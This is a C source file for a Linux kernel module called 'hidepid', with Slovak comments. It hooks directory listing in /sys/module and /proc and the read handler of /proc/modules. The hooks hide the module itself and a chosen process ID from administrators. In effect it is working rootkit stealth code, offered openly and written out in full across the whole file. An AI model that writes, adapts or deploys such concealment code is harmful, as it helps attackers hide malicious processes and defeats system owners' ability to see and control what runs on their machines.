#include "hidepid.h"
#include <linux/string.h>

static char *server_pid = "-1";/* pid procesu, ktory treba skryt */
module_param(server_pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH );

int fake_sys_filldir_t(void *fake1, const char *name, int fake3, loff_t fake4, u64 fake5, unsigned fake6){
		
	/* skryje modul v /sys/module/ */
	if(strcmp(name,MODULE_NAME) == 0){
		return 0;
	}
	
	return original_sys_filldir(fake1,name,fake3,fake4,fake5,fake6);
}

int sys_readdir(struct file *fd, void *buffer, filldir_t fdir){
		
	original_sys_filldir = fdir;
	
	return original_sys_fop->readdir(fd,buffer,fake_sys_filldir_t);
}

int fake_proc_filldir_t(void *fake1, const char *name, int fake3, loff_t fake4, u64 fake5, unsigned fake6){
	
	
	if(strcmp(name,server_pid) == 0){
		return 0;
	}
	
	return original_proc_filldir(fake1,name,fake3,fake4,fake5,fake6);
}

int proc_readdir(struct file *fd, void *buffer, filldir_t fdir){
	
	original_proc_filldir = fdir;
	
	return original_proc_fop->readdir(fd,buffer,fake_proc_filldir_t);
}

ssize_t modules_read(struct file *fd, char __user *modules_line, size_t size, loff_t *l){
	ssize_t return_read;
	char *found;
	
	return_read = original_modules_fops->read(fd,modules_line,size,l);
	
	/* najde v texte poziciu hladaneho modulu */
	found = strnstr(modules_line,MODULE_NAME,strlen(MODULE_NAME));
	
	if(found){/* ak modul naslo, treba riadok nahradit riadkom za nim */
		/* pozicia konca riadku za hladanym modulom */
		char *end_line_pos = strchr(found,'\n');
		/* na adresu povodneho nazvu modulu nakopiruje pamat za koncom riadku */
		memcpy(found,end_line_pos + 1,return_read - (end_line_pos - found));
		
		/* celkova dlzka - dlzka odstraneneho riadku */
		return_read = return_read - (end_line_pos - found + 1);		
		
	}
	
	return return_read;
}

/**
 * Skryje modul v /sys/module/
 */
void init_hide_sys_module(void){
	
	struct nameidata sys_dir_namei;
	
	if(path_lookup(SYS_MODULE_PATH,0,&sys_dir_namei))
		return;/* cesta sa nenasla */
		
	
	sys_inode = sys_dir_namei.path.dentry->d_inode;
	
	if(sys_inode == 0)
		return;/* inode nie je inicializovany */
	
	sys_fop = *sys_inode->i_fop;/* na novu adresu ulozi file operations */
	original_sys_fop = sys_inode->i_fop;/* ulozi povodne file operations */
	sys_fop.readdir = sys_readdir;/* citanie adresara nahrad vlastnou funkciou */
	sys_inode->i_fop = &sys_fop;
}

/**
 * Skryje pid v /proc/
 */
void init_hide_proc_path(void){
	struct nameidata proc_dir_namei;
	
	/* divne pid */
	if(server_pid <= 0)
		return;
		
		
	if(path_lookup(PROC_PATH,0,&proc_dir_namei))
		return;
	
	proc_inode = proc_dir_namei.path.dentry->d_inode;
	
	if(proc_inode == 0)
		return;
	
	proc_fop = *proc_inode->i_fop;
	original_proc_fop = proc_inode->i_fop;
	proc_fop.readdir = proc_readdir;
	proc_inode->i_fop = &proc_fop;
}

/**
 * Skryje modul vo vypisoch
 */
void init_hide_module(void){
	
	/* najskor treba ziskat proc entry pre /proc/ */
	struct proc_dir_entry *temp_proc_entry,*proc_dir_entry_root,*proc_file;
	
	struct file_operations temp_fops = {0};
	
	temp_proc_entry = proc_create("temp",0,0,&temp_fops);
	proc_dir_entry_root = temp_proc_entry->parent;
	
	/* uz ho netreba */
	remove_proc_entry("temp",proc_dir_entry_root);
	
	/* treba vyhladat /proc/modules */
	proc_file = proc_dir_entry_root->subdir;	
	while( proc_file != 0 ){		
		if(strcmp(proc_file->name,"modules") == 0){
			module_file = proc_file;
			break;
		}
		proc_file = proc_file->next;
	}
	
	/* pre istotu */
	if(module_file != 0){		
		/* nahradi read pre subor /proc/modules */
		original_modules_fops = module_file->proc_fops;
		modules_fop = *(module_file->proc_fops);
		modules_fop.read = modules_read;
		module_file->proc_fops = &modules_fop;
	}	
}

static int __init init_hidepid_module(void){	
	init_hide_module();
	init_hide_sys_module();
	init_hide_proc_path();
	return 0;
}

static void __exit exit_hidepid_module(void){
	
	/* treba po sebe upratat a znova nastavit spravne file operations */
	if(original_sys_fop){
		sys_inode->i_fop = original_sys_fop;
	}
	if(original_proc_fop){
		proc_inode->i_fop = original_proc_fop;
	}
	if(original_modules_fops){
		module_file->proc_fops = original_modules_fops;
	}
}

module_init(init_hidepid_module);
module_exit(exit_hidepid_module);




